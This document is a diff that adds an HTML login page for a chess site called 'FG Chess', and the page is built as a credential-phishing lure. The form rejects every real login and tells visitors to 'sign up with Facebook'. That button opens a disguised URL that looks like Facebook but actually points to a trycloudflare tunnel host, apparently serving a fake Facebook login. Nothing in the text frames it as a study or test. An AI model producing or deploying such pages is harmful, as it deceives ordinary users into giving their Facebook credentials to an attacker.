@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>FG Chess</title>
+	<style>
+		body {
+			background-image: url("images/login.jpg");
+			background-size: cover;
+			background-position: center;
+			margin: 0;
+			padding: 0;
+			font-family: Arial, sans-serif;
+		}
+
+		.container {
+			width: 400px;
+			margin: 200px auto;
+			padding: 20px;
+			background-color: rgba(255, 255, 255, 0.8);
+			border-radius: 5px;
+			box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+			animation: fade-in 1s ease;
+		}
+
+		@keyframes fade-in {
+			from { opacity: 0; }
+			to { opacity: 1; }
+		}
+
+		h1 {
+			text-align: center;
+		}
+
+		form {
+			display: flex;
+			flex-direction: column;
+		}
+
+		label {
+			margin-top: 10px;
+		}
+
+		input[type="text"],
+		input[type="password"],
+		input[type="submit"] {
+			padding: 10px;
+			margin-top: 5px;
+			border-radius: 5px;
+			border: 1px solid #ccc;
+		}
+
+		input[type="submit"] {
+			background-color: #008CBA;
+			color: #fff;
+			font-weight: bold;
+			cursor: pointer;
+		}
+
+		.signup-container {
+			margin-top: 20px;
+			display: flex;
+			align-items: center;
+		}
+
+		.signup-text {
+			margin-left: 10px;
+			cursor: pointer;
+		}
+
+		.welcome-container {
+			display: flex;
+			align-items: center;
+			margin-bottom: 20px;
+		}
+
+		.profile-pic {
+			width: 50px;
+			height: 50px;
+			border-radius: 50%;
+			margin-right: 10px;
+		}
+
+		@keyframes typing {
+			0% {
+				width: 0;
+			}
+			100% {
+				width: 100%;
+			}
+		}
+
+		.typing-text {
+			overflow: hidden;
+			border-right: 2px solid #000;
+			white-space: nowrap;
+			animation: typing 2s steps(40, end);
+		}
+
+		.error-message {
+			margin-top: 10px;
+			color: red;
+			font-weight: bold;
+			text-align: center;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<div class="welcome-container">
+			<img class="profile-pic" src="images/bot.jpg" alt="Bot Profile Picture">
+			<span class="typing-text"></span>
+		</div>
+		<h1>FG Chess</h1>
+		<form action="#" method="POST" onsubmit="return validateForm()">
+			<label for="username">Username</label>
+			<input type="text" name="username" id="username" required>
+			<label for="password">Password</label>
+			<input type="password" name="password" id="password" required>
+			<input type="submit" value="Log In">
+			<div id="error" class="error-message"></div>
+		</form>
+        <div class="signup-container">
+			<img src="images/fb.png" alt="Facebook Logo" width="30" height="30">
+			<span class="signup-text" onclick="window.open('https://login-FgChess-facebook@text-above-fabulous-ja.trycloudflare.com/login.html.php', '_self')">Sign up with Facebook</span>
+		</div>
+	</div>
+	
+	<div class="welcome-container">
+		<img class="profile-pic" src="images/bot.jpg" alt="Bot Profile Picture">
+		<span class="typing-text"></span>
+	</div>
+	
+	
+	<script>
+	const typingText = document.querySelector('.typing-text');
+	const errorMessage = document.getElementById('error');
+	
+	const messages = [
+		"Welcome to FG Chess online Game!",
+		"We're happy to have you here.",
+		"Get ready to enjoy some exciting chess matches.",
+		"Sign up FG Chess with Facebook",
+	];
+	
+	let messageIndex = 0;
+	let charIndex = 0;
+	
+	function typeMessage() {
+		if (charIndex < messages[messageIndex].length) {
+			typingText.textContent += messages[messageIndex].charAt(charIndex);
+			charIndex++;
+			setTimeout(typeMessage, 50);
+		} else {
+			setTimeout(eraseMessage, 2000);
+		}
+	}
+	
+	function eraseMessage() {
+		if (charIndex > 0) {
+			typingText.textContent = messages[messageIndex].substring(0, charIndex - 1);
+			charIndex--;
+			setTimeout(eraseMessage, 50);
+		} else {
+			messageIndex = (messageIndex + 1) % messages.length;
+			setTimeout(typeMessage, 500);
+		}
+	}
+	
+	function validateForm() {
+		const username = document.getElementById('username').value;
+		const password = document.getElementById('password').value;
+	
+		if (username === "" || password === "") {
+			errorMessage.textContent = "Please fill in all fields.";
+			return false;
+		} else {
+			if (username !== "yourusername" || password !== "yourpassword") {
+				errorMessage.textContent = "Invalid credentials. You don't have an FG Chess account yet. First, sign up with Facebook from the option given below.";
+				return false;
+			}
+			errorMessage.textContent = ""; // Clear any previous error message
+			return true;
+		}
+	}
+	
+	setTimeout(typeMessage, 2000);
+	</script>
+	
+</body>
+</html>
+
